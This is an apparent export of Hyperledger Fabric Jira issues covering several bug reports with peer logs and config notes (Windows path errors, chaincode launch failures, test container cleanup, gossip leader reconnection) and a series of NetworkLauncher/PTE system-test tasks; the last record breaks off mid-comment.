english colon[:] path problem on windows when lifecycle chaincode install,FAB-17315,43843,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,KevinXiong1977,KevinXiong1977,08/Jan/20 6:16 PM,16/Jan/20 1:30 AM,28/Oct/23 3:09 AM,16/Jan/20 1:30 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,fabric-tools,,,,,,,,0,ipm,,,,,"*Scenario:*
When I run the lifecycle chaincode install on Widows 10, the fabric system reports the following error:
---------------------------
  [chaincode.persistence] Save -> ERRO 032 error writing chaincode install package to D:\windows_raft_single\production\lifecycle\chaincodes\wrappy:0dc532c044d971f4ce9920446beceb47e82caeed0a51f9bff8b892994a526c5f.tar.gz: error renaming temp file 'D:\windows_raft_single\production\lifecycle\chaincodes\.ccpackage.963446270': rename D:\windows_raft_single\production\lifecycle\chaincodes\.ccpackage.963446270 D:\windows_raft_single\production\lifecycle\chaincodes\wrappy:0dc532c044d971f4ce9920446beceb47e82caeed0a51f9bff8b892994a526c5f.tar.gz: The filename, directory name, or volume label syntax is incorrect.

*Testing:*
My system specs:

     Windows 10.0.17134.1069
     Go 1.13.5 windows / amd64
     Docker Desktop 2.1.0.4 (39773), Docker 19.03.4
     Fabric v2.0.0-beta Release Notes - December 12, 2019",,KevinXiong1977,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17288,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zlt",,,,Unset,Unset,,"peer lifecycle chaincode package chaincode-wrappy.tar.gz --path /opt/gopath/src/github.com/hyperledger/fabric/chaincode/chaincode-wrappy --lang node --label wrappy

peer lifecycle chaincode install chaincode-wrappy.tar.gz",,Unset,,,,,,Unset,,Unset,,(Please add usage information),KevinXiong1977,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Jan/20 4:48 AM;sykesm;Follow-up commit: https://github.com/hyperledger/fabric/pull/492;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode Instantiation fails,FAB-17316,43861,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Test Error,,indirajith,indirajith,08/Jan/20 11:20 PM,19/Apr/20 1:16 PM,28/Oct/23 3:09 AM,19/Apr/20 1:16 PM,v1.4.4,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"Chaincode instantiation fails with the following error: Error: could not assemble transaction, err proposal response was not successful, error code 500, msg chaincode registration failed: container exited with 0

Peer logs: 
2020-01-08 11:00:06.356 UTC [container] unlockContainer -> DEBU 2a22380 container lock deleted(ccex-1.0)                                                                                                       
2020-01-08 11:00:06.356 UTC [container] lockContainer -> DEBU 2a22381 waiting for container(ccex-1.0) lock                                                                                                     
2020-01-08 11:00:06.356 UTC [container] lockContainer -> DEBU 2a22382 got container (ccex-1.0) lock                                                                                                            
2020-01-08 11:00:06.357 UTC [container] unlockContainer -> DEBU 2a22383 container lock deleted(ccex-1.0)                                                                                                       
2020-01-08 11:00:06.970 UTC [chaincode] Launch -> DEBU 2a22384 stopping due to error while launching: container exited with 0                                                                                  
github.com/hyperledger/fabric/core/chaincode.(*RuntimeLauncher).Launch.func1                                                                                                                                   
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/runtime_launcher.go:63                                                                                                                    
runtime.goexit                                                                                                                                                                                                 
        /opt/go/src/runtime/asm_amd64.s:1337                                                                                                                                                                   
chaincode registration failed                                                                                                                                                                                  
2020-01-08 11:00:06.970 UTC [container] lockContainer -> DEBU 2a22385 waiting for container(ccex-1.0) lock                                                                                                     
2020-01-08 11:00:06.970 UTC [container] lockContainer -> DEBU 2a22386 got container (ccex-1.0) lock                                                                                                            
2020-01-08 11:00:06.970 UTC [dockercontroller] stopInternal -> DEBU 2a22387 stopping container id=dev-peer1-org1.inuit.local-ccex-1.0                                                                          
2020-01-08 11:00:06.972 UTC [dockercontroller] stopInternal -> DEBU 2a22388 stop container result error=""Container not running: dev-peer1-org1.inuit.local-ccex-1.0""                                           
2020-01-08 11:00:06.972 UTC [dockercontroller] stopInternal -> DEBU 2a22389 killing container id=dev-peer1-org1.inuit.local-ccex-1.0                                                                           
2020-01-08 11:00:06.973 UTC [dockercontroller] stopInternal -> DEBU 2a2238a kill container result id=dev-peer1-org1.inuit.local-ccex-1.0 error=""Container not running: dev-peer1-org1.inuit.local-ccex-1.0""    
2020-01-08 11:00:06.973 UTC [dockercontroller] stopInternal -> DEBU 2a2238b removing container id=dev-peer1-org1.inuit.local-ccex-1.0                                                                          
2020-01-08 11:00:06.994 UTC [dockercontroller] stopInternal -> DEBU 2a2238c remove container result id=dev-peer1-org1.inuit.local-ccex-1.0 error=null                                                          
2020-01-08 11:00:06.994 UTC [container] unlockContainer -> DEBU 2a2238d container lock deleted(ccex-1.0)                                                                                                       
2020-01-08 11:00:06.994 UTC [chaincode] Launch -> DEBU 2a2238e launch complete                                                                                                                                 
2020-01-08 11:00:06.994 UTC [chaincode] Deregister -> DEBU 2a2238f deregister handler: ccex:1.0                                                                                                                
2020-01-08 11:00:06.995 UTC [endorser] callChaincode -> INFO 2a22390 [twoorgschannel][ee388f68] Exit chaincode: name:""lscc""  (2194ms)                                                                          
2020-01-08 11:00:06.995 UTC [endorser] SimulateProposal -> ERRO 2a22391 [twoorgschannel][ee388f68] failed to invoke chaincode name:""lscc"" , error: container exited with 0                                     
github.com/hyperledger/fabric/core/chaincode.(*RuntimeLauncher).Launch.func1                                                                                                                                   
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/runtime_launcher.go:63                                                                                                                    
runtime.goexit                                                                                                                                                                                                 
        /opt/go/src/runtime/asm_amd64.s:1337                                                                                                                                                                   
chaincode registration failed                                                                                                                                                                                  
2020-01-08 11:00:06.995 UTC [endorser] SimulateProposal -> DEBU 2a22392 [twoorgschannel][ee388f68] Exit                                                                                                        
2020-01-08 11:00:06.995 UTC [lockbasedtxmgr] Done -> DEBU 2a22393 Done with transaction simulation / query execution [ee388f68e1cd108e4c6a25734b8f2d118159c506aa8fbe592ff6197e9d91f4d3]                        
2020-01-08 11:00:06.995 UTC [endorser] func1 -> DEBU 2a22394 Exit: request from 172.27.0.6:60100                                                                                                               
2020-01-08 11:00:06.995 UTC [comm.grpc.server] 1 -> INFO 2a22395 unary call completed grpc.service=protos.Endorser grpc.method=ProcessProposal grpc.peer_address=172.27.0.6:60100 grpc.code=OK grpc.call_durati
on=2.196501277s 

CouchDB logs:
 [notice] 2020-01-08T10:32:40.658466Z nonode@nohost <0.26885.977> 5e0e7bb328 couchdbp1o1:5984 172.27.0.3 peer1-org1 GET /twoorgschannel_lscc/ccex?attachments=true 404 ok 6
[notice] 2020-01-08T10:32:50.764234Z nonode@nohost <0.26885.977> 2444308cfe couchdbp1o1:5984 172.27.0.3 peer1-org1 GET /twoorgschannel_lscc/ccex?attachments=true 404 ok 2
[info] 2020-01-08T10:33:53.424588Z nonode@nohost <0.49.0> -------- alarm_handler: {clear,system_memory_high_watermark}
[notice] 2020-01-08T10:45:06.788531Z nonode@nohost <0.3350.978> 0f7d9fb3c3 couchdbp1o1:5984 172.27.0.3 peer1-org1 GET /twoorgschannel_lscc/ccex?attachments=true 404 ok 6
[info] 2020-01-08T10:45:53.449210Z nonode@nohost <0.49.0> -------- alarm_handler: {set,{system_memory_high_watermark,[]}}
[notice] 2020-01-08T10:50:05.758308Z nonode@nohost <0.3350.978> 85fffb07af couchdbp1o1:5984 172.27.0.3 peer1-org1 GET /twoorgschannel_lscc/ccex?attachments=true 404 ok 3
[notice] 2020-01-08T10:51:56.255489Z nonode@nohost <0.3350.978> 4549b88065 couchdbp1o1:5984 172.27.0.3 peer1-org1 GET /twoorgschannel_lscc/ccex?attachments=true 404 ok 3
[notice] 2020-01-08T11:00:04.819775Z nonode@nohost <0.20263.978> ffc337309e couchdbp1o1:5984 172.27.0.3 peer1-org1 GET /twoorgschannel_lscc/ccex?attachments=true 404 ok 3

",,denyeart,indirajith,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01763:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,indirajith,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Feb/20 4:21 AM;denyeart;[~indirajith] The issue has not been reported by others. Are you still seeing this problem? Any idea under what condition the problem occurs?;;;","25/Mar/20 10:52 PM;sykesm;The logs appear to show the peer instantiating the container, the chaincode connecting to the peer, and then the chaincode exiting with an exit code of 0. The chaincode logs (from docker, or merged with the peer if vm.docker.attachStdout is set to true) will show up in the peer logs.

At this point, the recommendation is to look at those logs to see if you can determine why the chaincode is exiting.;;;","19/Apr/20 1:16 PM;denyeart;Closing due to lack of response from reporter.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
core/chaincode/exectransaction_test does not cleanup init_public_data container,FAB-17317,43865,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,09/Jan/20 3:29 AM,10/Jan/20 12:16 AM,28/Oct/23 3:09 AM,10/Jan/20 12:16 AM,v2.0.0,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,,,,,,"When running unit-tests for the *github.com/hyperledger/fabric/core/chaincode* package, 
 a container named *init_public_data* is created and remains after the test is finished as follows.
{code:sh}
$ docker ps -a
CONTAINER ID        IMAGE                                                                                 COMMAND                  CREATED              STATUS                      PORTS               NAMES
bbcde81b2c6b        init_public_data-0-872058146178760a923334b089b45bf126af47784e957364e5cc75af1da59306   ""chaincode -peer.add…""   About a minute ago   Exited (0) 57 seconds ago                       init_public_data-0
{code}
The following test in *github.com/hyperledger/fabric/core/chaincode/exectransaction_test.go*:
{code:java}
                url = ""github.com/hyperledger/fabric/core/chaincode/testdata/src/chaincodes/init_public_data""
                cID = &pb.ChaincodeID{Name: ""init_public_data"", Path: url, Version: ""0""}

                f = ""init""
                args = util.ToChaincodeArgs(f)

                spec = &pb.ChaincodeSpec{Type: 1, ChaincodeId: cID, Input: &pb.ChaincodeInput{Args: args}}

                ccContext = &CCContext{
                                Name:    ""init_public_data"",
                                Version: ""0"",
                }

                
                resp, err := deploy(channelID, ccContext, spec, nextBlockNumber, chaincodeSupport)
{code}
creates the *init_public_data* container but does not clean it up.

To clean it up, the following code should be added.
{code:java}
defer chaincodeSupport.Runtime.Stop(cID.Name + "":"" + cID.Version)
{code}",,denyeart,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0176r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tatsu-sato,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Jan/20 12:16 AM;denyeart;Merged in master: https://github.com/hyperledger/fabric/pull/475;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic with kafka, couchdb, 1 chan, samplecc go cc",FAB-17318,43866,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 3:47 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:42 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"This is a test scenario using NL+PTE:
 * test_FAB3833_2i_FAB3810_2q
 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using kafka, couchdb, 1 channel, 2 thrds samplecc go chaincode
 * Use PTE to execute invokes and queries, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfo:u",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 3:43 AM;bharadwajambati1;Executed in Daily-PTE test suite;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic with kafka, leveldb, 1 chan, samplecc go cc",FAB-17319,43867,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 3:50 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:45 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"This is a test scenario using NL+PTE. It is same as FAB-17318 but uses leveldb instead of couchdb).
 * test_FAB3808_2i_FAB3811_2q

 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using kafka, leveldb, 1 channel, 2 thrds samplecc go chaincode
 * Use PTE to execute invokes and queries, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfo:w",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 3:45 AM;bharadwajambati1;Executed in Daily-PTE test suite;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic with raft, couchdb, 1 chan, samplejava cc",FAB-17320,43868,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 3:53 AM,25/Jan/20 2:57 AM,28/Oct/23 3:09 AM,25/Jan/20 2:57 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"This is a test scenario using NL+PTE:
 * test_FAB3832_4i_FAB3834_4q  (convert from kafka to raft, and convert cc from golang to java)

 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using raft, couchdb, 1 channel, 4 thrds samplejava chaincode
 * Use PTE to execute invokes and queries, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.",,bharadwajambati1,denyeart,scottz,,,,,,,,,,,,,,,,,,,FAB-17216,FAB-17437,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jan/20 2:56 AM;bharadwajambati1;FAB-3832-4i-test.log;https://jira.hyperledger.org/secure/attachment/18105/FAB-3832-4i-test.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|i00uze:rzczqzxyzzx8w9",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),bharadwajambati1,denyeart,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jan/20 11:40 PM;denyeart;How is this different from FAB-17332 ?;;;","25/Jan/20 2:56 AM;bharadwajambati1;FAB-17332 was tested in Kubernetes. This one using NL+PTE tools using a docker environment.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic with raft, leveldb, 1 chan, samplejava cc",FAB-17321,43869,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 3:56 AM,25/Jan/20 2:55 AM,28/Oct/23 3:09 AM,25/Jan/20 2:55 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"This is a test scenario using NL+PTE. Same as FAB-17320 but using leveldb instead.
 * test_FAB3807_4i_FAB3835_4q (convert from kafka to raft, and convert cc from golang to java)

 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using raft, leveldb, 1 channel, 4 thrds samplejava chaincode
 * Use PTE to execute invokes and queries, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.

 ",,scottz,,,,,,,,,,,,,,,,,,,,,FAB-17216,FAB-17437,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jan/20 2:54 AM;bharadwajambati1;FAB-3807-4i-test.log;https://jira.hyperledger.org/secure/attachment/18104/FAB-3807-4i-test.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|i00uze:rzczqzxyzzx8wi",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic with raft, couchdb rich queries variations, 2 chans, samplecc",FAB-17322,43870,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,scottz,scottz,09/Jan/20 4:06 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:46 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"This is a test scenario using NL+PTE:
 * test_FAB6813_4i_marbles_FAB8199_4q_FAB8200_4q_FAB8201_4q (convert from kafka to raft); using couchdb index file 

 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using raft, couchdb, 2 channels, 4 thrds marbles02 go chaincode
 * Use PTE to execute invokes and 3 types of rich queries, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,FAB-17216,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfo:y",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 3:46 AM;bharadwajambati1;Executed in Daily-PTE test suite;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: traffic with full channel block events,FAB-17323,43871,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 4:15 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:48 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"This is a test scenario using NL+PTE. 
 * test_FAB7329_4i_channel_events (convert from kafka to raft)

 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using raft, leveldb, 1 channel, 4 thrds samplejs nodejs chaincode, register client with full channel block events
 * Use PTE to execute invokes and queries, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,FAB-17216,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfp:",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 3:47 AM;bharadwajambati1;Executed in Daily-PTE test suite;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic with raft, leveldb, 1 chan, samplejs nodejs cc",FAB-17324,43872,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 4:20 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:49 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"This is a test scenario using NL+PTE. 
 * test_FAB7333_4i_filtered_block_events (convert from kafka to raft)

 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using raft, leveldb, 1 channel, 4 thrds samplejs nodejs chaincode, register client with filtered block events
 * Use PTE to execute invokes and queries, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,FAB-17216,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfp:2",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 3:49 AM;bharadwajambati1;Executed in Daily-PTE test suite;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic in Latency Mode with raft, leveldb, 1 chan, samplecc, 1 tx per block",FAB-17325,43873,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 4:26 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,22/Jan/20 3:50 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"This is a test scenario using NL+PTE.
 *  test_FAB7647_1i_latency (convert from kafka to raft)

 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using raft, leveldb, 1 channel, 1 thread samplecc go chaincode
 * Use PTE in Latency Mode to execute invokes sequentially, using blocksize=1, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,FAB-17216,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfp:4",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 3:50 AM;bharadwajambati1;Executed in Daily-PTE test suite;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: traffic with raft, leveldb, 4 channels, samplecc",FAB-17326,43874,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,bharadwajambati1,scottz,scottz,09/Jan/20 4:31 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,23/Jan/20 4:31 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ContinuousDelivery,NetworkLauncher,,,,"test_FAB7929_8i

This is a test scenario using NL+PTE. 
 * test_FAB7929_8i (convert to raft)

 * Use NetworkLauncher to launch a small network (3 orderers, 2 orgs and 2 peers per org).
 * Configure using raft, leveldb, 4 channels, 8 threads (2 each) samplecc go chaincode
 * Use PTE to execute invokes and queries, and calculate TPS and confirm all transactions are successful. There should be no panics and no error logs observed.
 * Tear down network.",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,FAB-17216,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 4:31 AM;bharadwajambati1;FAB-7929-8i-test.log;https://jira.hyperledger.org/secure/attachment/18100/FAB-7929-8i-test.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,Automated,,Unset,No,,,"1|hzwqfp:6",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 4:30 AM;bharadwajambati1;This test case is ran using NL and PTE.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When leader election is disabled, gossip should not give up on retrieving blocks.",FAB-17327,43875,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,jyellick,jyellick,09/Jan/20 4:35 AM,28/Jan/20 6:04 AM,28/Oct/23 3:09 AM,28/Jan/20 6:04 AM,v1.4.4,v2.0.0,,,,,,,,v1.4.5,v2.0.0,,,fabric-peer,,,,,,,,,0,ipm,,,,,"The blocksprovider is configured with a total amount of time it should attempt to retrieve blocks before giving up.  This is useful for when leader election is enabled, because the leader peer might not be able to reach an ordering node (say because of a network partition) but another peer could.

However, when leader election is disabled, this means that if the peer loses contact with the orderers for a sufficient amount of time, the static leader will step down as leader, and never receive new blocks.  This is undesirable, and requires a peer restart to get the peer to begin acting as a leader again.",,jyellick,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zlri",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),jyellick,sykesm,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Jan/20 12:01 AM;sykesm;In core.yaml two options: “use leader election” and “is leader”
{ useLeaderElection: false, orgLeader: true } —> static leader

(When orgLeader is false and useLeaderElection is false, the peer will never connect directly to the orderer. Peer will panic if both are true.)

With the default configuration we actually use leader election to determine who connects to the peer:
{code}
useLeaderElection: true
orgLeader: false
{code}

{{reconnectTotalTimeThreshold}} controls how long before step down; default is 3600s; if connectivity is down for 1hr, the peer needs to be restarted as we will no longer attempt to connect to the orderer.

So, when configured as a static leader, logically disable (ignore) the reconnect threshold and continue attempts to connect to the orderer.

